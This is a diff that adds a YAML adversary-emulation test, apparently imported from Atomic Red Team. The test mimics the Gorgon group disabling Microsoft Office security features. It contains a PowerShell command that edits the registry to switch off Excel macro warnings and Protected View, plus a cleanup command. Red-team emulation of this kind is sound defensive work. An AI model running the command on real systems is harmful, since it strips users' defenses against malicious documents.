@@ -1,0 +1,44 @@
+- id: 6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7
+  name: Disable Microsoft Office Security Features
+  description: 'Gorgon group may disable Office security features so that their code
+    can run. Upon execution, an external document will not
+
+    show any warning before editing the document.
+
+
+
+    https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.001
+    name: 'Impair Defenses: Disable or Modify Tools'
+  platforms:
+    windows:
+      psh:
+        command: New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel"; New-Item
+          -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security"; New-Item -Path
+          "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"; New-ItemProperty
+          -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings"
+          -Value "1" -PropertyType "Dword"; New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
+          -Name "DisableInternetFilesInPV" -Value "1" -PropertyType "Dword"; New-ItemProperty
+          -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
+          -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword"; New-ItemProperty
+          -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
+          -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"
+        cleanup: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security"
+          -Name "VBAWarnings" -ErrorAction Ignore | Out-Null; Remove-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
+          -ErrorAction Ignore
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1562.001
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2020-02-21T20:32:20.810Z'
+    atomic_guid: 6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7
+    import_timestamp: '2025-06-24T11:15:01.030798Z'
